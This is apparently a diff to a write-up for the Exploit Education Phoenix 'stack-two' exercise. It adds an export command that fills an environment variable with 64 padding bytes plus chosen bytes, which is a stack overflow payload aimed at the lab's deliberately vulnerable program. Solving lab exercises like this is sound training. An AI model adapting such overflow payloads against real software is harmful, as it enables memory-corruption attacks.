@@ -65,9 +65,10 @@ Welcome to phoenix/stack-two, brought to you by https://exploit.education
 Well done, you have successfully set changeme to the correct value
 ➜  amd64 
 
-
-
 ```
 
+```
+export ExploitEducation=$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\n\t\n\r')")
+```
 
  ~Kurama
